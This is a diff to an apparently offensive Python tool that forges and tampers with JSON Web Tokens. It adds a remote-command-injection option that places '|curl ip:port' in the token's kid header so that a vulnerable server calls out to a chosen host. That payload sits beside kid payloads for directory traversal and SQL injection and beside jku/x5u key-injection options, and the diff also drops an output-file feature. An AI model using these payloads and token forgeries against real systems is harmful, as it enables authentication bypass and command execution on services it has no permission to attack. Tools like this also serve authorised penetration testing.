@@ -88,13 +88,12 @@ class Cracker:
                                     the new header, so you should run an attack that will process
                                     that header.]
         -d --decode                [Decode the token and quit.]
-        -o --output <file>         [Specify a file to write a fancy output.]
            --unverified            [Act as the host does not verify the signature.]
            --auto-try <hostname>   [If it's present the script will retrieve the key
                                     using openssl. If the host uses this key to signs
                                     its token, it will work.]
            --specify-key <string>  [A string used as key.]
-           --inject-kid <exploit>  [Try to inject a payload in the kid header; dirtrv, sqli.]
+           --inject-kid <exploit>  [Try to inject a payload in the kid header; dirtrv, sqli or rce.]
            --jku-basic <yourURL>   [Basic jku injection. jku attacks are complicated, you need
                                     some configs. You have to host the jwks.json crafted file
                                     on your pc or on a domain you own. Pass it to this parameter,
@@ -140,8 +139,8 @@ class Cracker:
 {Bcolors.HEADER}Command:{Bcolors.ENDC} {Bcolors.OKCYAN}{" ".join(command)}{Bcolors.ENDC}
         """
 
-    def __init__(self, token, alg, path_to_key, user_payload, remove_from, add_into, auto_try, kid, specified_key,
-                 jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, output_file, unverified=False, decode=False, manual=False):
+    def __init__(self, token, alg, path_to_key, user_payload, remove_from, add_into, auto_try, kid, kid_curl_info, specified_key,
+                 jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, unverified=False, decode=False, manual=False):
         """
         :param token: The user input token -> str.
         :param alg: The algorithm for the attack. HS256 or None -> str.
@@ -150,14 +149,13 @@ class Cracker:
         :param remove_from: What the user want to delete in the header or in the payload -> list.
         :param add_into: What the user want to add in the header (useless in the payload) -> list.
         :param auto_try: The hostname from which the script try to retrieve a key via openssl -> str.
-        :param kid: The type of payload to inject in the kid header. DirTrv or SQLi -> str.
+        :param kid: The type of payload to inject in the kid header. DirTrv, SQLi or RCE -> str.
         :param specified_key: A string set to be used as key -> str.
         :param jku_basic: The main url on which the user want to host the malformed jwks file -> str.
         :param jku_redirect: Comma separated server url and the user one -> str.
         :param jku_header_injection: The server url vulnerable to HTTP header injection -> str
         :param x5u_basic: The main url on which the user want to host the malformed jwks file -> str.
         :param x5u_header_injection: The server url vulnerable to HTTP header injection -> str.
-        :param output_file: A file to write a description of the run attack into -> str
         :param unverified: A flag to set if the script have to act as the host doesn't verify the signature -> Bool.
         :param decode: A flag to set if the user need only to decode the token -> Bool.
         :param manual: A flag to set if the user need to craft an url manually -> Bool.
@@ -179,13 +177,13 @@ class Cracker:
         self.add_into = add_into
         self.auto_try = auto_try
         self.kid = kid
+        self.kid_curl_info = kid_curl_info
         self.specified_key = specified_key
         self.jku_basic = jku_basic
         self.jku_redirect = jku_redirect
         self.jku_header_injection = jku_header_injection
         self.x5u_basic = x5u_basic
         self.x5u_header_injection = x5u_header_injection
-        self.output_file = output_file
         self.unverified = unverified
         self.decode = decode
         self.manual = manual
@@ -197,8 +195,6 @@ class Cracker:
         self.validation()
         self.token_dict = Cracker.dictionarize_token(token)
         self.original_token_header, self.original_token_payload = Cracker.decode_encoded_token(self.token_dict)
-        """Needed to write the output file if -o is present"""
-        self.args = locals()
 
     def validation(self):
         """
@@ -311,6 +307,13 @@ class Cracker:
                 elif self.kid.lower() == "sqli":
                     self.kid = "SQLi"
                     self.key = "zzz"
+                elif self.kid.lower() == "rce":
+                    pattern = r'^.+:.*$'
+                    if not self.kid_curl_info or not re.match(pattern, self.kid_curl_info):
+                        print(f"{Bcolors.FAIL}ERROR: Missing or invalid --kid-curl-info. You must specify an ip:port (or ip: if port is 80){Bcolors.ENDC}")
+                        sys.exit(2)
+                    self.kid = "RCE"
+                    self.key = "itdoesnotmatter"
                 else:
                     print(
                         f"{Bcolors.FAIL}ERROR: Invalid --inject-kid. Please select a valid one{Bcolors.ENDC}"
@@ -344,7 +347,7 @@ class Cracker:
                       self.auto_try, self.kid, self.specified_key,
                       self.jku_basic, self.jku_redirect, self.jku_header_injection,
                       self.remove_from, self.x5u_basic, self.x5u_header_injection,
-                      self.add_into, self.output_file
+                      self.add_into,
         ]
         if any(arg is not None for arg in other_args) or self.unverified or self.manual:
             print(f"{Bcolors.WARNING}WARNING: You have not to specify any other argument if you want to decode the token{Bcolors.ENDC}", Cracker.usage)
@@ -353,42 +356,6 @@ class Cracker:
               f"{Bcolors.HEADER}Payload:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_payload}{Bcolors.ENDC}"
               )
         sys.exit(0)
-
-    def generate_output(self, **kwargs):
-        """
-        A function that generates an output string to write in the file specified in the -o options.
-        For now this function is bad writtend since it grab some values from the class attributes, and others via
-        keyword arguments. Anyway for now it works.
-        """
-        already_specified_keys = ["self", "token", "alg", "user_payload", "path_to_key", "remove_from", "add_into", "specified_key"]
-        file_output = f"""
-{Bcolors.OKBLUE}[ORIGINAL]{Bcolors.ENDC}
-{Bcolors.HEADER}ORGINAL_TOKEN{Bcolors.ENDC} = {self.args['token']}
-{Bcolors.HEADER}ORIGINAL_HEADER{Bcolors.ENDC} = {self.args['token'].split(".")[0]}
-{Bcolors.HEADER}ORIGINAL_PAYLOAD{Bcolors.ENDC} = {self.args['token'].split(".")[1]}
-{Bcolors.HEADER}ORIGINAL_SIGNATURE{Bcolors.ENDC} = {self.args['token'].split(".")[2]}
-
-{Bcolors.OKBLUE}[ORIGINAL_DECODED]{Bcolors.ENDC}
-{Bcolors.HEADER}ORIGINAL_DECODED_HEADER{Bcolors.ENDC} = {self.original_token_header}
-{Bcolors.HEADER}ORIGINAL_DECODED_PAYLOAD{Bcolors.ENDC} = {self.original_token_payload}
-
-{Bcolors.OKBLUE}[OPTIONS]{Bcolors.ENDC}
-{Bcolors.HEADER}ALG{Bcolors.ENDC} = {self.args['alg']}
-{Bcolors.HEADER}KEY{Bcolors.ENDC} = {self.key}
-{Bcolors.HEADER}REMOVED{Bcolors.ENDC} = {[item[0] for item in self.args['remove_from']] if self.args['remove_from'] else 'nothing'}
-{Bcolors.HEADER}ADDED{Bcolors.ENDC} = {[item[0] for item in self.args['add_into']] if self.args['add_into'] else 'nothing'}
-{Bcolors.HEADER}PAYLOAD_CHANGES{Bcolors.ENDC} = {[item[0] for item in self.args['user_payload']] if self.args['user_payload'] else 'nothing'}
-{Bcolors.HEADER}OTHER_OPTIONS{Bcolors.ENDC} = {[f"{k}: {v}" for k, v in self.args.items() if k not in already_specified_keys and v]}
-
-{Bcolors.OKBLUE}[NEW]{Bcolors.ENDC}
-{Bcolors.HEADER}NEW_DECODED_HEADER{Bcolors.ENDC} = {kwargs['ndh']}
-{Bcolors.HEADER}NEW_DECODED_PAYLOAD{Bcolors.ENDC} = {kwargs['ndp']}
-{Bcolors.HEADER}NEW_HEADER{Bcolors.ENDC} = {kwargs['nh']}
-{Bcolors.HEADER}NEW_PAYLOAD{Bcolors.ENDC} = {kwargs['np']}
-{Bcolors.HEADER}NEW_SIGNATURE{Bcolors.ENDC} = {kwargs['ns']}
-{Bcolors.HEADER}NEW_TOKEN{Bcolors.ENDC} = {kwargs['nt']}
-     \n """
-        return file_output
 
     def modify_header_and_payload(self):
         """
@@ -693,15 +660,21 @@ class Cracker:
         :return: The related payload string
 
         """
+        if self.kid_curl_info:
+            ip = self.kid_curl_info.split(":")[0]
+            port = self.kid_curl_info.split(":")[1] if self.kid_curl_info.split(":")[1] else "80"
         kid_payloads = {
             "DirTrv": "../../../../../dev/null",
             "SQLi": "' union select 'zzz",
+            "RCE": f"|curl {ip}:{port} -m 1",
         }
 
         if self.kid == "DirTrv":
             return kid_payloads['DirTrv']
         elif self.kid == "SQLi":
             return kid_payloads['SQLi']
+        elif self.kid == "RCE":
+            return kid_payloads['RCE']
 
     @staticmethod
     def check_token(token):
@@ -928,14 +901,6 @@ class Cracker:
         new_partial_token = Cracker.craft_token(header, payload)
         signature = self.select_signature(new_partial_token)
         final_token = new_partial_token + "." + signature
-        if self.output_file:
-            content_ = self.generate_output(
-                ndh=header, ndp=payload, nh=new_partial_token.split(".")[0],
-                np=new_partial_token.split(".")[1], ns=signature, nt=final_token
-            )
-            with open(self.output_file, 'w') as outfile:
-                outfile.write(content_)
-            subprocess.run(f"chmod 400 {self.output_file}", shell=True, stdin=self.devnull, stderr=self.devnull, stdout=self.devnull)
         print(f"{Bcolors.HEADER}Crafted header ={Bcolors.ENDC} {Bcolors.OKCYAN}{header}{Bcolors.ENDC}, {Bcolors.HEADER}Crafted payload ={Bcolors.ENDC} {Bcolors.OKCYAN}{payload}{Bcolors.ENDC}")
         print(f"{Bcolors.BOLD}{Bcolors.HEADER}Final Token:{Bcolors.ENDC} {Bcolors.BOLD}{Bcolors.OKBLUE}{final_token}{Bcolors.ENDC}")
         if self.file is not None:
@@ -981,10 +946,6 @@ if __name__ == '__main__':
                         help="Just decode the token and quit.",
                         required=False
                         )
-    parser.add_argument("-o", "--output",
-                        help="Write a an informative description to the specified file",
-                        metavar="<filename>", required=False
-                        )
     parser.add_argument("--remove-from", action="append", nargs="+",
                         help="The section of the token, and the key name to delete as key:value pairs",
                         metavar="<section>:<key>", required=False,
@@ -1004,6 +965,10 @@ if __name__ == '__main__':
     parser.add_argument("--inject-kid",
                         help="Try for kid injection. Choose a valid payload (DirTrv, SQLi)",
                         metavar="<payload>", required=False
+                        )
+    parser.add_argument("--kid-curl-info",
+                        help="Specify ip:port (or 'ip:' if port is 80) to send a request to",
+                        metavar="<ip>:<port>", required=False
                         )
     parser.add_argument("--specify-key",
                         help="Specify a string to use as key", metavar="<key>",
@@ -1038,8 +1003,8 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     cracker = Cracker(
-        args.token, args.alg, args.key, args.payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid, args.specify_key,
-        args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic, args.x5u_inbody, args.output, args.unverified, args.decode, args.manual
+        args.token, args.alg, args.key, args.payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid, args.kid_curl_info, args.specify_key,
+        args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic, args.x5u_inbody, args.unverified, args.decode, args.manual
     )
     # Start the cracker
     cracker.run()
